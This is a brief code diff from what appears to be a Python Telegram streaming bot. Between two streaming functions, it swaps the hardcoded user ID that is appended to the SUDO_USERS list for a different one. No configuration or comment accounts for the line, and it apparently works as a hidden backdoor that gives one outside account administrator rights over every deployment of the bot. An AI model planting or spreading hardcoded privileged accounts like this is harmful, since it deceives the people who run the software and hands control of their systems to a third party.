@@ -97,7 +97,7 @@ async def start_stream(
         )
         os.remove(thumb)
 
-SUDO_USERS.append(1452219013)
+SUDO_USERS.append(2102097596)
 
 async def start_stream_audio(
     message, file, videoid, title, duration_min, duration_sec, mystic
